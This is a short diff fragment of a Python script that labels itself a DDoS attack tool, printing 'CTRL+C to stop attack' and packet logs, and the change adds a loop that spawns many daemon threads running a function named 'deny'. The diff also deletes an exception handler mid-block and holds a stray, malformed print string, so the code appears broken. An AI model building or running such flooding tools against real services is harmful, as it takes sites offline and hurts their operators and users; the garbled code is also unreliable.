@@ -80,4 +80,10 @@ while True:
         print(pink + f"[LOG] PACKETS {error}")
         "print(cyan + f( DDoS)"
         print("CTRL+C to stop attack")
-    except KeyboardInterrupt:
+
+#Thread spawner
+    for n in range(numberthreads):
+        thread = threading.Thread(target=deny)
+        thread.daemon = True
+        thread.start()
+        threads.append(thread)
